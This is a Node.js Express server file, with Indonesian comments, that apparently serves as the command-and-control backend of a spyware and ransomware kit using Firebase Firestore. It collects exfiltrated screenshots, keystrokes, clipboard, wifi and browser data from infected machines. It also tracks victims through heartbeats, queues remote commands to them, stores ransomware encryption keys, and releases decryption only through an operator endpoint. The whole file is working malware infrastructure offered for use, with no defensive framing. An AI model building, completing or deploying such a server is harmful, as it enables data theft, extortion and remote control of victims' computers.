const express = require('express');
const admin = require('firebase-admin');
const Busboy = require('busboy');
const crypto = require('crypto');

// Inisialisasi Firebase (gunakan environment variable untuk produksi)
if (!process.env.FIREBASE_SERVICE_ACCOUNT) {
    throw new Error('FIREBASE_SERVICE_ACCOUNT environment variable is not set!');
}
const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

const app = express();
app.use(express.json({ limit: '50mb' }));
const router = express.Router();

// ============ UTILITY ============
function parseMultipart(req) {
    return new Promise((resolve, reject) => {
        const bb = Busboy({ headers: req.headers });
        const fields = {};
        let fileBuffer = null;
        let filename = '';
        bb.on('file', (fieldname, file, info) => {
            filename = info.filename;
            const chunks = [];
            file.on('data', d => chunks.push(d));
            file.on('end', () => { fileBuffer = Buffer.concat(chunks); });
        });
        bb.on('field', (fieldname, val) => { fields[fieldname] = val; });
        bb.on('finish', () => resolve({ fields, fileBuffer, filename }));
        bb.on('error', reject);
        req.pipe(bb);
    });
}

// ============ EXFIL ENDPOINT ============
router.post('/exfil', async (req, res) => {
    try {
        const contentType = req.headers['content-type'] || '';
        if (contentType.includes('multipart/form-data')) {
            const { fields, fileBuffer, filename } = await parseMultipart(req);
            const sessionId = fields.session_id || fields.sessionId || 'unknown';
            const type = fields.type || 'screenshot';
            const docRef = await db.collection('exfil').add({
                sessionId, type, filename: filename || `${type}_${Date.now()}.png`,
                data: fileBuffer ? fileBuffer.toString('base64') : null,
                timestamp: admin.firestore.FieldValue.serverTimestamp(),
                metadata: fields
            });
            await db.collection('agents').doc(sessionId).set({
                lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
                lastExfil: type
            }, { merge: true });
            res.json({ success: true, id: docRef.id });
        } else {
            const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
            const sessionId = data.session_id || data.sessionId || 'unknown';
            // Jika type ransomware_key, simpan encrypted_key di koleksi agents
            if (data.type === 'ransomware_key' && data.data && data.data.encrypted_key) {
                await db.collection('agents').doc(sessionId).set({
                    ransomwareEncryptedKey: data.data.encrypted_key,
                    ransomwareTime: admin.firestore.FieldValue.serverTimestamp()
                }, { merge: true });
            }
            const docRef = await db.collection('exfil').add({
                ...data, timestamp: admin.firestore.FieldValue.serverTimestamp()
            });
            await db.collection('agents').doc(sessionId).set({
                lastHeartbeat: admin.firestore.FieldValue.serverTimestamp()
            }, { merge: true });
            res.json({ success: true, id: docRef.id });
        }
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ HEARTBEAT ============
router.post('/heartbeat', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { session_id, hostname, username, os, ip, is_admin, process_id, modules } = data;
        const agentData = {
            sessionId: session_id,
            hostname: hostname || 'unknown',
            username: username || 'unknown',
            os: os || data.os_info || 'unknown',
            ip: ip || 'unknown',
            isAdmin: is_admin || false,
            processId: process_id || null,
            modules: modules || [],
            lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
            firstSeen: admin.firestore.FieldValue.serverTimestamp(),
            status: 'active'
        };
        const existing = await db.collection('agents').doc(session_id).get();
        if (existing.exists) delete agentData.firstSeen;
        await db.collection('agents').doc(session_id).set(agentData, { merge: true });
        res.json({ success: true, next_poll: 15, server_time: new Date().toISOString() });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ COMMANDS ============
router.get('/get_commands', async (req, res) => {
    try {
        const sessionId = req.query.session_id;
        if (!sessionId) return res.status(400).json({ success: false, error: 'session_id required' });
        const now = new Date().toISOString();
        const snapshot = await db.collection('commands')
            .where('target_session', 'in', [sessionId, 'all'])
            .where('status', '==', 'pending')
            .get();
        const commands = [];
        snapshot.forEach(doc => {
            const data = doc.data();
            if (!data.scheduled_time || data.scheduled_time <= now) {
                commands.push({ id: doc.id, ...data });
            }
        });
        commands.sort((a, b) => (a.scheduled_time || '').localeCompare(b.scheduled_time || ''));
        const limitedCommands = commands.slice(0, 10);
        res.json({ success: true, commands: limitedCommands, count: limitedCommands.length });
    } catch (err) {
        console.error(err);
        res.json({ success: false, commands: [], count: 0, error: err.message });
    }
});

router.post('/send_command', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { target_session, command_type, parameters, scheduled_time } = data;
        if (!target_session || !command_type) return res.status(400).json({ success: false, error: 'Missing fields' });
        const commandDoc = {
            target_session, command_type, parameters: parameters || {}, status: 'pending',
            created_at: admin.firestore.FieldValue.serverTimestamp(),
            scheduled_time: scheduled_time || new Date().toISOString(),
            created_by: 'dashboard'
        };
        const docRef = await db.collection('commands').add(commandDoc);
        res.json({ success: true, command_id: docRef.id });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

router.post('/command_complete', async (req, res) => {
    try {
        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { command_id, status, result, error, session_id, command_type } = data;
        if (!command_id) return res.status(400).json({ success: false, error: 'command_id required' });
        await db.collection('commands').doc(command_id).update({
            status: status || 'completed',
            completed_at: admin.firestore.FieldValue.serverTimestamp(),
            result: result || null, 
            error: error || null, 
            completed_by: session_id || 'unknown'
        });
        await db.collection('exfil').add({
            sessionId: session_id || 'unknown', 
            type: 'command_result', 
            command_id, 
            command_type: command_type || 'unknown',
            status: status || 'completed', 
            result: result || null, 
            error: error || null, 
            timestamp: admin.firestore.FieldValue.serverTimestamp()
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ AGENTS & DATA ============
router.get('/agents', async (req, res) => {
    try {
        const snapshot = await db.collection('agents').orderBy('lastHeartbeat', 'desc').get();
        const agents = [];
        snapshot.forEach(doc => agents.push({ id: doc.id, ...doc.data() }));
        res.json({ success: true, agents });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

router.delete('/agents/:id', async (req, res) => {
    try {
        await db.collection('agents').doc(req.params.id).delete();
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// Endpoint untuk mendapatkan data exfil per kategori dan per session
router.get('/exfil_data', async (req, res) => {
    try {
        const sessionId = req.query.session_id;
        const type = req.query.type;
        
        const snapshot = await db.collection('exfil').orderBy('timestamp', 'desc').limit(500).get();
        const items = [];
        snapshot.forEach(doc => {
            const data = doc.data();
            const matchSession = sessionId ? data.sessionId === sessionId : true;
            const matchType = (type && type !== 'all') ? data.type === type : true;
            
            if (matchSession && matchType) {
                items.push({ id: doc.id, ...data });
            }
        });
        res.json({ success: true, data: items });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============ DECRYPT SESSION (RSA) ============
router.post('/decrypt_session', async (req, res) => {
    try {
        const { session_id, private_key } = req.body;
        if (!session_id || !private_key) {
            return res.status(400).json({ success: false, error: 'Missing session_id or private_key' });
        }

        // Ambil encrypted key dari collection agents
        const agentDoc = await db.collection('agents').doc(session_id).get();
        if (!agentDoc.exists) {
            return res.status(404).json({ success: false, error: 'Session not found' });
        }

        const encryptedKeyBase64 = agentDoc.data().ransomwareEncryptedKey;
        if (!encryptedKeyBase64) {
            return res.status(404).json({ success: false, error: 'No ransomware key for this session' });
        }

        // Pastikan private_key sudah dalam format PEM (termasuk BEGIN/END)
        let pemKey = private_key;
        if (!private_key.includes('-----BEGIN')) {
            // Jika user hanya memasukkan base64 tanpa header, tambahkan header
            pemKey = `-----BEGIN PRIVATE KEY-----\n${private_key}\n-----END PRIVATE KEY-----`;
        }

        const encryptedBuffer = Buffer.from(encryptedKeyBase64, 'base64');
        const decryptedKey = crypto.privateDecrypt(
            {
                key: pemKey,
                padding: crypto.constants.RSA_PKCS1_PADDING   // Ganti dengan OAEP jika public key menggunakan OAEP, tapi kita gunakan PKCS1
            },
            encryptedBuffer
        ).toString('utf8');

        // Kirim command decrypt ke agent
        const commandRef = await db.collection('commands').add({
            target_session: session_id,
            command_type: 'decrypt',
            parameters: { key: decryptedKey },
            status: 'pending',
            scheduled_time: new Date().toISOString(),
            created_at: admin.firestore.FieldValue.serverTimestamp(),
            created_by: 'dashboard'
        });

        res.json({ success: true, command_id: commandRef.id, message: 'Decrypt command sent' });
    } catch (err) {
        console.error('Decrypt error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// Dashboard aggregated data (sessions, plus counts per type)
router.get('/dashboard_data', async (req, res) => {
    try {
        const sessionsSnap = await db.collection('agents').orderBy('lastHeartbeat', 'desc').get();
        const sessions = [];
        sessionsSnap.forEach(d => sessions.push({ id: d.id, ...d.data() }));
        const exfilSnap = await db.collection('exfil').orderBy('timestamp', 'desc').limit(1000).get();
        const grouped = { screenshot: [], clipboard: [], keylog: [], wifi: [], browser: [], system: [], command_result: [] };
        exfilSnap.forEach(doc => {
            const item = doc.data();
            if (item.type === 'screenshot') grouped.screenshot.push(item);
            else if (item.type === 'clipboard') grouped.clipboard.push(item);
            else if (item.type === 'keylog' || item.type === 'keylogger') grouped.keylog.push(item);
            else if (item.type === 'wifi') grouped.wifi.push(item);
            else if (item.type === 'browser') grouped.browser.push(item);
            else if (item.type === 'system_info') grouped.system.push(item);
            else if (item.type === 'command_result') grouped.command_result.push(item);
        });
        res.json({ success: true, sessions, ...grouped });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.use('/api', router);
module.exports = app;